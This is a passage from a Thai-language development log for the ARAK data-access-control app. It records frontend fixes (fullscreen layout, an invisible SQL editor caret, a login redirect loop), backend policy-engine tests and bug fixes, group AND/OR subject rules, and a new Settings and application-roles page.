   → `tw:max-h-[30%]` (สัดส่วนของ panel ไม่ใช่ค่าคงที่) + `MIN_RESULT_HEIGHT` 140 → **240**
4. **`useRef` + `ResizeObserver` กับ portal** — เข้า/ออกโหมดเต็มจอย้าย DOM ทั้งก้อน → node ใหม่ แต่ ref object ตัวเดิม → effect ไม่ rerun → **observer เกาะ node ที่หลุดออกจาก document ไปแล้ว** → ออกจากเต็มจอที 1280×720 แถวหลุดอีก
   → เปลี่ยนเป็น **callback ref** (`useState<HTMLDivElement | null>`) ให้ effect rerun ตอน node เปลี่ยน

#### โหมดเต็มจอ (ผู้ใช้ขอ: "เต็มหน้า ไม่ต้องเห็น menu ข้างๆ หรือข้างบน")

ปุ่ม **Full screen** ใน toolbar + **Esc** ออก → ซ่อน top bar, side nav และหัวข้อ "Query" + คำอธิบายทั้งย่อหน้า

> **กับดักที่เสียเวลานานที่สุด:** `tw:fixed tw:inset-0 tw:z-50` **ไม่พอ** — `.arak-page-enter` มี `animation: ... both` ที่ keyframes มี `transform` → มันกลายเป็น **containing block ของ `position: fixed`** และเป็น **stacking context ของตัวเอง** → `inset-0` กลายเป็นขอบเขตของ *หน้า* ไม่ใช่ viewport และ top bar (`sticky z-50`) ยังทับทับขึ้นมาถึงแม้ z-index จะสูงกว่า
> **ทางแก้:** `createPortal(consoleTree, document.body)` — ออกจาก subtree ที่ transform ไปเลย ไม่ใช่ไล่ z-index เอา

#### หลักฐานหลังแก้ — 4 ขนาดจอ × 3 สถานะ (normal / fullscreen / กด Esc กลับ)

```
1920x1080 normal   belowFold:false     fullscr belowFold:false gridH:602   after-Esc belowFold:false
1536x864  normal   belowFold:false     fullscr belowFold:false gridH:386   after-Esc belowFold:false
1366x768  normal   belowFold:false     fullscr belowFold:false gridH:246   after-Esc belowFold:false
1280x720  normal   belowFold:false     fullscr belowFold:false gridH:202   after-Esc belowFold:false
fs-chrome (ทุกขนาด): overlayInBody:true topbarCovered:true sidebarCovered:true titleVisible:false
```

`npx tsc --noEmit` ผ่าน · `npx jest` → 7 suites / 25 tests ผ่าน

#### ไฟล์ที่แก้ — [QueryPage.tsx](frontend/app/src/pages/query/QueryPage.tsx) ไฟล์เดียว

| สิ่งที่เพิ่ม | หน้าที่ |
|---|---|
| `useFillViewport(node, disabled)` | วัดที่ว่างจริงใต้ chrome แทนที่จะเดา |
| `useElementHeight(node)` | ความสูง pane สำหรับ clamp ค่า splitter ที่ save ไว้ |
| `fullscreen` state + `createPortal` | โหมดเต็มจอ |
| `shownEditorHeight` | ค่า split ที่ save จากจอใหญ่ **ไม่ไปกินที่ grid บนจอเล็ก** (clamp ตอนอ่าน ไม่ตอนเขียน → preference ไม่หาย) |

> **บทเรียน:** ผมอธิบายสองรอบแรกจากการเดา ไม่ใช่การวัด รอบนี้เดิน DOM จาก `tbody` ขึ้นไปทีละชั้นจนเจอชั้นที่ `top` มากกว่า `bottom` ของ parent — สามบรรทัดของตารางเดียวชี้ชัดกว่าการเดาสามรอบรวมกัน

### O6. 🐛 Cursor ใน SQL editor หาย—วาดอยู่ แต่วาดด้วยสีโปร่งใส

**ที่มา:** ผู้ใช้ถาม "Cursor ในนี้หายไปไหน" พร้อมภาพ SQL editor

**สาเหตุ:** [SqlEditor.tsx](frontend/app/src/pages/query/SqlEditor.tsx) เป็น `<textarea>` ที่วางทับบน `<pre>` ที่ทำ syntax highlight — ตัว textarea จึงต้องเป็น `tw:text-transparent` เพื่อให้ชั้นสีข้างล่างทะลุขึ้นมา แต่ class เดิมเขียนไว้ว่า:

```
tw:text-transparent tw:caret-current
```

`caret-current` = `caret-color: currentColor` → **currentColor ก็คือ transparent นั่นเอง** cursor จึงถูกวาด ถูกตำแหน่ง และกะพริบอยู่ตลอด—ด้วยสีโปร่งใส คนใช้เลยอ่านว่า editor หลุด focus

**แก้เป็น:** `tw:caret-text-primary` (ตาม theme → dark mode ตามไปเอง)

#### ⚠️ กับดักของ prefix `tw:` — ห้ามเขียน `tw:xxx-[var(--color-...)]`

ความพยายามแรกของผมคือ `tw:caret-[var(--color-text-primary)]` — **compile ผ่าน ไม่ error แต่ไม่ทำงาน** วัดใน browser ได้:

```
caret-color: rgba(0, 0, 0, 0)        ❌ ยังโปร่งใสเหมือนเดิม
getComputedStyle(root)['--color-text-primary'] === ''    ← ต้นเหตุ
```

**เพราะ Tailwind 4 ที่ตั้ง prefix `tw` เปลี่ยนชื่อ CSS variable ของ theme ทุกตัวเป็น `--tw-<name>` ด้วย** ไม่ใช่แค่ชื่อ class:

| เขียน | ได้ CSS | runtime |
|---|---|---|
| `tw:caret-[var(--color-text-primary)]` | `caret-color: var(--color-text-primary)` | ❌ ตัวแปรไม่มีจริง → transparent |
| `tw:caret-text-primary` | `caret-color: var(--tw-color-text-primary)` | ✅ `rgb(24, 29, 39)` |

> **กฎ:** ในโปรเจกต์นี้ **ให้เรียก utility ตามชื่อ token (`tw:caret-text-primary`) เสมอ** อย่าเขียน `var(--color-*)` ดิบใน arbitrary value — ถ้าจำเป็นจริงต้องเขียน `var(--tw-color-*)`
> grep ทั้ง `app/src` และ `ui-core-components/src` แล้ว **ไม่มีที่อื่นที่พลาดแบบเดียวกัน**

#### วิธียืนยัน — วัด ไม่ใช่ดู

screenshot พิสูจน์ cursor ไม่ได้ (มันกะพริบ) จึงใช้ Playwright อ่าน computed style แทน:

```
{ caretColor: "rgb(24, 29, 39)", color: "rgba(0, 0, 0, 0)", focused: true }
```

ตัวอักษรยังโปร่งใสตามที่ตั้งใจ (ชั้น highlight ต้องทะลุขึ้นมา) แต่ cursor ทึบแล้ว

#### Test ใหม่ — [SqlEditor.test.tsx](frontend/app/src/pages/query/SqlEditor.test.tsx) (4 tests)

jsdom ไม่ resolve Tailwind จึง assert ที่ class name ตรงๆ — ซึ่งเป็นที่ที่บั๊กนี้อยู่พอดี:

| test | กันอะไร |
|---|---|
| caret มีสีของตัวเอง | กันการกลับไปใช้ `caret-current` คู่กับ `text-transparent` อีก |
| gutter มีเลขครบทุกบรรทัด + `aria-hidden` | screen reader ไม่ต้องอ่าน "1 2 3" นำ |
| Tab = เว้นวรรค ไม่ใช่ออกจากช่อง | |
| Ctrl+Enter = run และไม่ขึ้นบรรทัดใหม่ | |

`npx tsc --noEmit` ผ่าน · `npx jest` → **8 suites / 29 tests** (เดิม 7/25)

### O7. หัวหน้าหน้า Query — ตัดคำอธิบายทิ้ง ย้ายปุ่ม Full screen ไปขวาบน

**ที่มา:** ผู้ใช้สั่ง "เอาคำนี้ออกได้ไหม มันเกะกะ" (ย่อหน้าห้าบรรทัดใต้หัวข้อ Query) และ "เอา Full screen ไปไว้ขวาบน"

| เดิม | ใหม่ |
|---|---|
| `<h1>Query</h1>` + ย่อหน้า 5 บรรทัด | `<header>` เป็น flex row — `Query` ซ้าย / ปุ่ม **Full screen** ขวา |
| ปุ่ม Full screen อยู่ใน toolbar ข้างๆ Run | อยู่ขวาบนสุดของหน้า |
| `tw:mt-6` ใต้ header | `tw:mt-4` (header เหลือบรรทัดเดียวแล้ว) |

#### จุดที่ต้องระวัง — โหมดเต็มจอ**ซ่อน header ทั้งอัน**

ถ้าย้ายปุ่มไป header เฉยๆ พอเข้าโหมดเต็มจอแล้ว **ปุ่มออกจะหายไปด้วย** จึงประกาศ element ไว้ครั้งเดียว (`fullscreenToggle`) แล้ววางสองที่:

```
โหมดปกติ   → อยู่ใน <header> ขวาสุด คู่กับชื่อหน้า
โหมดเต็มจอ → <header> หาย → ย้ายไปอยู่ขวาสุดของ toolbar (chrome เดียวที่เหลือ)
```

Esc ยังใช้ได้เหมือนเดิม (ตั้งแต่ O5)

#### วัดแล้ว 3 viewport

```
1920x1080  blurbGone:true sameRowAsTitle:true docBelowFold:false  fs→exitInToolbar:true titleVisible:false  Esc→กลับปกติ docBelowFold:false
1366x768   เหมือนกัน  (gapToRightEdge 32px = ชิดขอบขวาของ content column)
1280x720   เหมือนกัน
```

> ที่ 1920 ระยะห่างขอบขวา 212px เพราะหน้าถูกครอบด้วย `max-w-7xl` ตาม AppShell — ปุ่มชิดขอบขวาของ **คอลัมน์เนื้อหา** ตรงกับทุกหน้าในแอป ไม่ใช่ขอบจอ

### O8. 🐛 หน้าขาวเปล่าที่ `/login` ตอน login เสร็จ — `<Navigate>` วน redirect ตัวเองจนเกิน 25 รอบ

**อาการที่ผู้ใช้เจอ:** "เป็นหน้าขาวเปล่า http://localhost:5274/login ตอน login เสร็จ"

**สิ่งที่ตัดออกไปก่อน:** `POST /api/v1/auth/login` ตอบ 200 ใน ~77ms ทั้งยิงตรงและผ่าน Vite proxy → พังฝั่ง client ล้วนๆ และ **profile ใหม่สะอาดๆ reproduce ไม่ได้** (login แล้วถึง `/` ใน 300ms, console เงียบสนิท) → เป็นบั๊กที่ขึ้นกับ *เส้นทางที่เดินมา* ไม่ใช่ขึ้นกับ state ที่ค้างใน localStorage

#### วิธีที่จับได้ — เลิกทดสอบทางที่ถูก แล้วไล่ทดสอบทางที่คนใช้จริงเดิน

เขียนสคริปต์ยิง 6 สถานการณ์รวดเดียว แล้วนับ console error:

| สถานการณ์ | ผล |
|---|---|
| **เปิด deep link `/query` ทั้งที่ยังไม่ login แล้วค่อย login** | 🔴 **`Maximum update depth exceeded` × 7** |
| กด Sign in รัวสองที | สะอาด |
| กด Enter สองที | สะอาด |
| login → กลับมา `/login` → login ใหม่ | สะอาด |
| กด Back หลัง login | `about:blank` — เป็นธรรมชาติของ `replace` (เหลือ history แค่ entry เดียว) ไม่ใช่บั๊ก |
| navigate ออกกลางม่าน | สะอาด (ตอนนั้น) |

**component stack ชี้ตรงไปที่ `RequireAuth` ไม่ใช่ `LoginPage`** และ **error เกิดตั้งแต่ก่อนกด login** — คนละที่กับที่ตั้งสมมติฐานไว้ทั้งสองข้อ

#### สาเหตุ

```tsx
// RequireAuth.tsx — ของเดิม
return <Navigate replace state={{ from: location }} to="/login" />;
```

`{ from: location }` เป็น **object ใหม่ทุก render** และ react-router 6.30 ใส่ `state` ไว้ใน dependency array ของ effect ที่เรียก `navigate()`:

```js
// node_modules/.vite/deps/react-router-dom.js:4509-4513
React.useEffect(() => navigate(JSON.parse(jsonPath), { replace, state, relative }),
                [navigate, jsonPath, relative, replace2, state]);
//                                                       ^^^^^ เปลี่ยน identity ทุก render
```

→ effect รันใหม่ → `navigate()` → render ใหม่ → object ใหม่ → effect รันใหม่ → **วน**

วงจรนี้หยุดเองเมื่อ route match เปลี่ยนแล้ว `RequireAuth` unmount ซึ่งเป็นการ **แข่งกัน ไม่ใช่การรับประกัน** — เครื่องผมแพ้ 7 รอบแล้วหลุด **แต่ถ้าแพ้ครบ 25 รอบ React เลิก warn แล้ว throw** → tree ทั้งก้อนถูก unmount → **หน้าขาวเปล่า โดย URL ค้างที่ `/login` เป๊ะตามที่ผู้ใช้รายงาน** เครื่องช้ากว่า / render เยอะกว่า = แพ้ง่ายกว่า ซึ่งอธิบายว่าทำไมผู้ใช้เจอแต่ผมไม่เจอ

> ⚠️ ตัวอย่างใน doc ของ react-router เองก็เขียน `state={{ from: location }}` แบบนี้ — มันรอดเพราะปกติ redirect unmount component ทันก่อน render รอบสอง **ไม่ใช่เพราะมันถูก**

#### สิ่งที่แก้

**1. [RequireAuth.tsx](frontend/app/src/auth/RequireAuth.tsx) — ทำให้ state มี identity คงที่**

```tsx
const from = useMemo(
  () => ({ from: { pathname: location.pathname, search: location.search, hash: location.hash } }),
  [location.pathname, location.search, location.hash]
);
...
return <Navigate replace state={from} to="/login" />;
```

memo จาก **primitive** ไม่ใช่จากตัว `location` (ซึ่งเปลี่ยน identity เอง) และเก็บ `search`/`hash` มาด้วย — คนที่ถูกเด้งมาจาก `/query?sql=...` กำลังดูของชิ้นหนึ่งอยู่ ทิ้ง query string = ส่งเขากลับไปหน้าเปล่าที่ถูกหน้าจอ

**2. [AuthSplash.tsx](frontend/app/src/auth/AuthSplash.tsx) — ย้าย timer ของม่านเข้ามาไว้ใน store**

ของเดิม `LoginPage` ตั้ง `setTimeout` แล้วให้ callback เรียก `splash.hide()` + `navigate()` — **แต่ `<Navigate>` unmount `LoginPage` ทิ้งตั้งแต่ token ลงทันที คือก่อน callback ราว 900ms**

นี่คือกับดักที่เกือบพลาด: ตอนแรกแก้ด้วยการ `clearTimeout` ตอน unmount ซึ่ง **จะยิ่งพังหนักกว่าเดิม** เพราะ callback ตัวนั้นคือสิ่งเดียวที่ลดม่านลง และม่านคือ `tw:fixed tw:inset-0 tw:z-200 tw:bg-primary` = **แผ่นทึบเต็มจอ → ม่านที่ไม่ลง ก็คือหน้าขาวเปล่า**

ทางที่ถูกคือ **ม่านต้องลดตัวเอง** ไม่ใช่ฝากคนที่ไม่อยู่แล้ว:

```ts
let pending: number | undefined;          // module scope — ม่านอายุยืนกว่าคนที่ยกมัน
show:      (phase) => { clearTimeout(pending); set({ phase }); },
hide:      ()      => { clearTimeout(pending); set({ phase: 'idle' }); },
hideAfter: (ms)    => { clearTimeout(pending); pending = setTimeout(() => set({ phase: 'idle' }), ms); },
```

`clearTimeout` ที่หัวทุกตัวทำหน้าที่เป็น generation guard ฟรีๆ — ม่าน sign-out ที่เพิ่งยกขึ้น จะไม่ถูก timer ของ sign-in รอบก่อนดึงลง

**3. [LoginPage.tsx](frontend/app/src/pages/LoginPage.tsx)**

```tsx
await signIn(username.trim(), password);
splash.hideAfter(AUTH_SPLASH_MS);     // แทน setTimeout ที่มี navigate ซ้ำอยู่ข้างใน
```

- `navigate()` ใน timer ถูกลบทิ้ง — มันคือ redirect ตัวเดิมยิงซ้ำรอบสอง 900ms ให้หลัง ใส่ tree ที่เดินไปไกลแล้ว (ผลข้างเคียงจริง: เดิมถ้า user กดไปหน้าอื่นระหว่างม่านขึ้น จะโดนลากกลับ — เทสต์ `nav-mid-curtain` เดิมจบที่ `/` ตอนนี้จบที่ `/policies` ตามที่ควรเป็น)
- `target` ไม่รับ `/login` เป็นปลายทาง (กันไว้ — ถ้าเกิดขึ้นจริงจะ redirect หาตัวเองจนหน้าขาว) และต่อ `search`/`hash` กลับเข้าไป
- `useNavigate` ไม่ถูกใช้แล้ว ลบ import ออก

#### ผลหลังแก้ (วัดด้วยสคริปต์เดิม)

```
at login, state.from = {"from":{"pathname":"/query","search":"","hash":""}}
t~500ms   loops=0    t~1000ms  loops=0    ...    t~7000ms  loops=0
total loop errors: 0
```

ทั้ง 6 สถานการณ์สะอาดหมด

#### Test — 6 ตัวใหม่ (รวมเป็น 10 suites / 35 tests)

| ไฟล์ | ทดสอบอะไร |
|---|---|
| [RequireAuth.test.tsx](frontend/app/src/auth/RequireAuth.test.tsx) | mock `<Navigate>` เก็บ prop ไว้ → render สองรอบ แล้ว assert `state` เป็น **object เดียวกัน** (`toBe`) — ทดสอบที่ *สาเหตุ* ไม่ใช่ที่อาการ เพราะอาการต้องแพ้ race ครบ 25 รอบถึงจะโผล่ ซึ่ง reproduce ใน jsdom ไม่ได้; + เก็บ `search`/`hash` ครบ; + มี token แล้วต้อง render ของที่มันเฝ้า |
| [AuthSplash.test.tsx](frontend/app/src/auth/AuthSplash.test.tsx) | ม่านลดเองได้โดยไม่ต้องพึ่งคนเรียก; `show` ใหม่ไม่ถูก timer เก่าดึงลง; `hide()` ตรงๆ ลงทันที (เคส password ผิด) |

#### บทเรียนที่ควรจำ

1. **"warning ใน console ที่ยังไม่เห็นว่ากระทบอะไร" ไม่ใช่เรื่องรอได้** — O3 บันทึกไว้ว่า "ยังไม่เห็นว่ากระทบการทำงาน" ทั้งที่มันคือหน้าขาวที่ผู้ใช้เจอ render loop ที่หยุดเองได้เพราะ**ชนะการแข่ง** จะแพ้เมื่อไหร่ก็ได้บนเครื่องที่ช้ากว่า
2. **reproduce ไม่ได้ใน profile สะอาด ≠ ขึ้นกับ state ที่ค้าง** — คราวนี้มันขึ้นกับ *เส้นทางที่เดินเข้ามา* (deep link) สมมติฐานสองข้อแรก (`target` เป็น `/login`, timer ค้าง) ผิดทั้งคู่ สิ่งที่ได้คำตอบคือการยิง 6 เส้นทางจริงรวดเดียวแล้วนับ error
3. **`clearTimeout` ตอน unmount ไม่ใช่คำตอบเสมอไป** — ถ้า callback นั้นคือสิ่งเดียวที่ปลดสถานะ global การยกเลิกมันคือการล็อกสถานะนั้นไว้ถาวร ของที่อายุยืนกว่า component ต้องไม่ถูกถือไว้ใน component

### P. ทดสอบ Data policy ให้ครบทุกเคส — เจอบั๊กจริงสองตัว

**ที่มา:** ผู้ใช้สั่ง *"ทดสอบเรื่อง Subscription และ Data policy ให้เยอะๆ อย่าให้มี Bug ทดสอบทุกแบบที่เป็นไปได้"*

ไฟล์ใหม่ [DataPolicyCompositionTest.java](backend/dac-engine/src/test/java/com/mfec/dac/engine/DataPolicyCompositionTest.java) — **26 tests / 4 nested class**

| nested class | tests | คุมอะไร |
|---|---|---|
| `RowFilters` | 6 | RLS หลายชั้น AND กัน, multi-value → `IN`, attribute ที่ principal ไม่มี, `ALWAYS_FALSE` |
| `ColumnMasks` | 8 | mask ชนกันบน column เดียว → เข้มสุดชนะ, cell mask (`condition`), mask จาก facet |
| `Hide` | 4 | ซ่อน column ทั้งคอลัมน์ ต่างจาก mask ยังไง, ซ่อน + mask พร้อมกัน |
| `Release` | 8 | `allowLocalOverride` + release จากชั้นที่ลึกกว่า, ชั้นที่ไม่ยอม override |

#### 🐛 บั๊ก 1 — `rowPredicates` ไม่ถูก sort → **FR-6.0c พังเงียบๆ**

`masks` กับ `hidden` ถูก sort ไว้แล้ว แต่ `rowPredicates` **ไม่** → ลำดับของ predicate เป็นไปตามลำดับที่ policy ถูกโหลดมา
predicate ทุกตัวถูก AND กันอยู่แล้ว **ลำดับจึงไม่มีความหมายเชิงตรรกะ** แต่มันมีผลกับ SQL ที่ compiler ทั้งสามตัว generate ออกมา
→ cross-mode consistency test (DoD ข้อ 6) ที่เทียบ **ทีละ byte** จะ fail/pass สลับกันไปตามลำดับแถวที่ query คืนมา ซึ่งเป็นบั๊กที่จะเสียเวลาไล่ที่สุดตอน M7b

```java
rowPredicates.sort(Comparator.comparing(PolicyEngine::signature));
```
`signature()` เอา**ทุก field** มาต่อกัน รวม `sourcePolicyId` ด้วย เพื่อให้สองตัวที่เท่ากันคือสองตัวที่พูดเรื่องเดียวกันจริงๆ (ตัวไหนอยู่ก่อนจึงไม่สำคัญ)

#### 🐛 บั๊ก 2 — column rule `ALLOW` ที่มี condition ต้องดูแถว → **ปล่อย plaintext ให้คนที่ condition นั้นตั้งใจกัน**

`ColumnRule.Action.ALLOW` = การ**ปลด** mask (release) ส่วน `MASK` = การ**ใส่** mask
เวลา expression ตีเป็น `ROW_DEPENDENT` (เช่นอ้าง `row.`) ของเดิมทำเหมือนกันทั้งสองทาง คือส่ง condition ต่อลงไปให้ compiler กลายเป็น cell mask
แต่ **release ไม่มีที่ให้เก็บ condition** — decision บันทึกได้แค่ "ปลด" กับ "ไม่ปลด" ไม่มีช่อง "ปลดเฉพาะบางแถว"
→ ของเดิมจึง**ปลด mask ทิ้งทั้ง column** ให้ principal ที่ condition เขียนไว้เพื่อกันออกไป

แก้ให้ release ที่ตัดสินไม่ได้ **ไม่ปลดอะไรเลย** พร้อมเหตุผลใน audit:
> `column rule with action ALLOW carries a condition that cannot be decided without a row (...); it releases nothing, because a release cannot be made conditional`

> นี่คือ invariant กลางของ engine — **input ที่ตัดสินไม่ได้ ต้องนับเป็นโทษของ principal เสมอ** ที่นี่เป็นจุดเดียวที่มันเคยรั่ว

---

### Q. ทดสอบ Subscription policy 45 เคส — **ไม่เจอบั๊กใหม่ เขียวหมดตั้งแต่รันแรก**

ไฟล์ใหม่ [SubscriptionPolicyTest.java](backend/dac-engine/src/test/java/com/mfec/dac/engine/SubscriptionPolicyTest.java) — **45 tests / 7 nested class**

| nested class | tests | คุมอะไร |
|---|---|---|
| `Exemptions` | 5 | exemption ที่ระบุ **team** ครอบสมาชิกด้วย · ตัวที่หมดอายุ "พอดีวินาทีนี้" = หมดแล้ว |
| `Lifecycle` | 8 | `DRAFT`/`DISABLED`/`ARCHIVED` ไม่มีผล · `validFrom` วินาทีนี้ = มีผลแล้ว · `validUntil` วินาทีนี้ = หมดแล้ว |
| `Environments` | 5 | DENY ที่ผูก env อื่น **ไม่** deny ที่นี่ (environment ขยายสิทธิ์ได้พอๆ กับที่บีบ) |
| `Gates` | 10 | DENY ที่ไม่ match = ไม่ใช่ประตู · **ALLOW ที่ไม่ match = ปิดทั้งชั้น** · sub-domain ที่ลึกกว่า override ตัวที่ตื้นกว่าได้ ไม่ใช่ทางกลับ |
| `Groups` | 10 | ฟีเจอร์ใหม่ในข้อ R |
| `Undecidable` | 3 | expression ที่ตัดสินไม่ได้ → ALLOW ไม่ให้อะไรเลย / DENY deny · คำอธิบายมีคำว่า `failing closed` |
| `NoBinding` | 4 | มีแต่ data policy → `no subscription policy binds` · policy เป็น null ข้าม · list เป็น null → deny · `effect` null อ่านเป็น ALLOW |

**พฤติกรรมที่อ่านแล้วสะดุด แต่จงใจ pin ไว้:** *exemption ที่ไปตกบน ALLOW จะ**ลบ grant ทิ้ง*** (exemption แปลว่า "ไม่ต้องอยู่ใต้ policy ตัวนี้" ไม่ใช่ "ได้รับการยกเว้นให้ผ่าน") ถ้าจะเปลี่ยนความหมายนี้ในอนาคต test จะพังให้เห็น ไม่ใช่เปลี่ยนเงียบๆ

#### ⚠️ กับดักที่เสียเวลาไปรอบหนึ่ง — Surefire + `@Nested`

`-Dtest=SubscriptionPolicyTest` **exit 0** และ `TEST-...SubscriptionPolicyTest.xml` เขียนว่า `tests="0"`
เพราะ **nested class เขียน report ของตัวเอง** (`TEST-...SubscriptionPolicyTest$Groups.xml`)

> **exit code 0 ไม่ได้พิสูจน์ว่า test ได้รัน** — ต้องนับจากไฟล์เสมอ:
> ```bash
> grep -ho 'tests="[0-9]*"' backend/dac-engine/target/surefire-reports/TEST-*.xml
> ```

**engine: 91 → 162 tests** (เดิม 91 + data policy 26 + subscription 45) เขียวทั้งหมด

---

### R. Subscription/Data policy กำหนด **by group หลายกลุ่ม AND/OR** ได้แล้ว (ผู้ใช้สั่ง)

เดิม `subjectRule.principals` เป็น **OR list** อย่างเดียว → เขียน "อยู่กลุ่ม A **หรือ** B" ได้ แต่เขียน "และต้องอยู่ C ด้วย" ไม่ได้

เพิ่ม field ที่สอง `requiredPrincipals` = **AND list** ทำงานทับบน `principals`:

| ชั้น | ไฟล์ | เปลี่ยนอะไร |
|---|---|---|
| Schema | [subjectRule.json](backend/dac-spec/src/main/resources/json/schema/entity/policy/subjectRule.json) | `requiredPrincipals: principalMatch[]` |
| Engine | [SubjectMatcher.java](backend/dac-engine/src/main/java/com/mfec/dac/engine/SubjectMatcher.java) | loop AND ก่อนเช็ค attribute + `describe()` เขียนเหตุผลลง audit ว่า**ขาดข้อไหน** |
| Test | `SubscriptionPolicyTest$Groups` | 10 tests |
| TS type | `src/generated/entity/policy/subjectRule.ts` | `yarn parse-schema` |
| Builder UI | [SubjectBuilder.tsx](frontend/app/src/pages/policies/SubjectBuilder.tsx) | แยก `PrincipalList` ออกมาแล้ว render สองครั้ง — *"Anyone who is"* / *"And who is also"* |
| ประโยคสรุป | [policyLanguage.ts](frontend/app/src/pages/policies/policyLanguage.ts) | `describePrincipal()` + clause `who is also ...` |

ครอบคลุมรูปแบบ **`(A or B) and C and D`** ซึ่งเป็นรูปที่คนเขียนจริง

#### ทำไมสองลิสต์แบน ไม่ใช่ boolean tree (บันทึกไว้จะได้ไม่ต้องเถียงใหม่)

| ทางเลือก | ทำไมไม่เอา |
|---|---|
| tree แบบ `assetSelector` (`condition`/`and`/`or`/`not`) | ต้องแก้ POJO ให้ recursive, matcher recursive, UI recursive, migrate policy ที่เก็บไว้แล้ว — จ่ายแพงเพื่อ nesting ที่ไม่มีใครเขียน |
| toggle ตัวเดียวพลิก `principals` จาก OR เป็น AND | เขียน `(A or B) and C` ไม่ได้ |
| ใช้ชื่อ `allOf` / `anyOf` | ชนกับ keyword ของ JSON Schema (เหตุผลเดียวกับที่ `assetSelector` เลี่ยงไว้ตั้งแต่แรก) |

เกินรูปนี้ไป ให้ไปใช้ `expression` ที่มีอยู่แล้ว

**UI จงใจซ่อนลิสต์ที่สองไว้จนกว่าลิสต์แรกจะมีอะไร** — ฟอร์มเปล่าที่มีสองลิสต์หน้าตาเหมือนกันคือวิธีที่คนจะพลาดความต่างระหว่างสองอันนี้
และแถวใหม่ตอนนี้ default เป็น `{ group: '' }` (เดิม `role`) ตามที่ผู้ใช้เน้นเรื่อง group

> 🔴 **jar ที่รันอยู่ตอนนี้เก่ากว่า `SubjectMatcher`** — service ที่รันค้างไว้จะยัง**ไม่**รู้จัก `requiredPrincipals` จนกว่าจะ rebuild + restart

---

### S. หน้า Settings แบ่งเป็นสามหัวข้อแบบ OpenMetadata + หน้า Application roles

ผู้ใช้สั่งหัวข้อมาตรงๆ สามอัน — ทำตามนั้นเป๊ะ เป็น card group แบบหน้า Settings ของ OM

ไฟล์ใหม่ [SettingsPage.tsx](frontend/app/src/pages/settings/SettingsPage.tsx)

| หัวข้อ | card |
|---|---|
| **Catalog & metadata** | OpenMetadata connection (admin) · Governance vocabulary · Catalog |
| **People & platform access** | **Application roles** · People & attributes · Local groups (M2, admin) |
| **Data source connections** | Registered sources (admin) · Service & build · Sync & reconcile (admin) |

card ที่ `adminOnly` ถูกกรองด้วย `hasRole('PLATFORM_ADMIN')` และหัวข้อที่ไม่เหลือ card เลยจะไม่ render

> เหตุผลที่หัวข้อ 2 กับ 3 **ต้องแยกกัน** ไม่ใช่เรื่องความสวย — *"ใครใช้ ARAK ได้"* กับ *"ใครอ่าน table ได้"* เป็นสิทธิ์คนละเรื่องที่ blast radius ต่างกันมาก console ที่เอามาไว้ด้วยกันคือ console ที่ชวนให้คนกดอันหนึ่งโดยคิดว่ากดอีกอัน

#### หน้าใหม่ — [AppRolesPage.tsx](frontend/app/src/pages/settings/AppRolesPage.tsx) ที่ `/settings/roles`

**ทุกบรรทัดใต้ "May" อ่านมาจาก `@Secured` / โค้ด authorise จริง ไม่ได้อ่านจาก requirement** และโชว์ไฟล์+บรรทัดไว้ข้างๆ ให้คนถัดไปตรวจซ้ำได้

| role | อ่านมาจาก |
|---|---|
| `PLATFORM_ADMIN` | `OpenMetadataSettingsResource.java:36` · `SyncResource.java:31` · `SourceResource.java:213` |
| `POLICY_AUTHOR` | `PolicyResource.java:187` (`authorise()` ผ่านทันที) |
| `DATA_OWNER` | `PolicyResource.java:197` — ต้องเป็น `isDescendantOrSelf` ของสิ่งที่ตัวเองเป็นเจ้าของ · scope ว่าง = ปฏิเสธ · **update authorise ทั้ง document เก่าและใหม่** จึงย้าย policy เข้ามาใน scope ตัวเองไม่ได้ |
| `AUDITOR` | `PolicyResource.java:41` (อ่านได้) — เขียนไม่ได้ |
| `REQUESTER` | `CatalogResource.java:31` — และ `QueryResource.java:83` **ไม่รับ** role นี้ |

**อ่านอย่างเดียว** เพราะ `PrincipalResource` จงใจเป็น read-only ตอน Entra เป็นเจ้าของข้อมูล — ฟอร์ม assign บนหน้านี้จะถูก sync รอบหน้าลบทิ้ง หน้าจึงบอกตรงๆ ว่า assignment จะไปอยู่ตรงไหนแทนที่จะวางปุ่มที่ไม่ทำอะไร

**Route ที่ต่อแล้ว** — `/settings` เดิม `Navigate` ไป `/settings/openmetadata` ตอนนี้เป็นหน้า hub จริง, เพิ่ม `/settings/roles`, และ [navigation.ts](frontend/app/src/layout/navigation.ts) ชี้ Settings ไปที่ `/settings`

#### 💬 ตอบคำถามผู้ใช้ — *"group/user ควรอยู่ในหน้า people เหมือนกันไหม / ควรแบ่ง Role ยังไง"*

**แยกสองหน้า เพราะเป็นคนละคำถาม แม้จะเป็น object เดียวกัน**

| | **People & attributes** (`/principals`) | **Settings → People & platform access** |
|---|---|---|
| ตอบคำถามว่า | *"มีใครบ้าง เขาถือ attribute/group อะไร"* | *"ใครควรทำอะไรใน ARAK ได้"* |
| ใครเปิด | คนเขียน policy — เปิดดู**ระหว่างเขียน** subject rule | admin — เปิดตอน onboard คนใหม่ |
| เป็นอะไร | **directory อ่านอย่างเดียว** | **การบริหาร** |

เอามารวมกันแล้วจะได้ปุ่ม "ทำให้เป็น platform admin" โผล่ให้คนที่แค่มาเปิดดูว่ามีใครอยู่ในกลุ่ม `credit-analysts` บ้าง
ทางเชื่อมที่ควรมี: ในแถวของคนใน People → ลิงก์ "Manage app roles" (เห็นเฉพาะ admin)

**การแบ่ง role ยึดแกนเดียว — "คนเขียน" ต้องไม่ใช่ "คนเปิดใช้"** (FR-9.1 `DRAFT → PENDING_APPROVAL → ACTIVE` บังคับด้วย `separationOfDuty()`)

| role | แกนที่มันแบ่ง |
|---|---|
| `POLICY_AUTHOR` | เขียนได้ทั้งองค์กร แต่เปิดใช้ของตัวเองไม่ได้ |
| `DATA_OWNER` | เหมือนกัน แต่ถูกล้อมด้วย ownership จาก OM |
| `AUDITOR` | อ่านได้หมด เขียนไม่ได้เลย — role ที่ทำให้ audit มีน้ำหนัก |
| `REQUESTER` | เห็นแค่ของตัวเอง (default ของทุกคน) |
| `PLATFORM_ADMIN` | คุมแพลตฟอร์ม **แต่ไม่ควรเป็นคนอนุมัติ policy ของตัวเอง** |

> ห้าตัวนี้ถูก fix ไว้ด้วย CHECK constraint ใน Flyway V2 แล้ว — เพิ่ม role ใหม่ต้อง migrate ไม่ใช่แก้ค่าคงที่ใน Java

---

### T. สองเรื่อง UI ที่ผู้ใช้ชี้

#### 1. icon ของ Data policy — cylinder → **`EyeOff`**

cylinder แปลว่า "database" อยู่ทุกที่ในเชลล์นี้ รวมถึงรางซ้ายที่อยู่ติดกันเลย
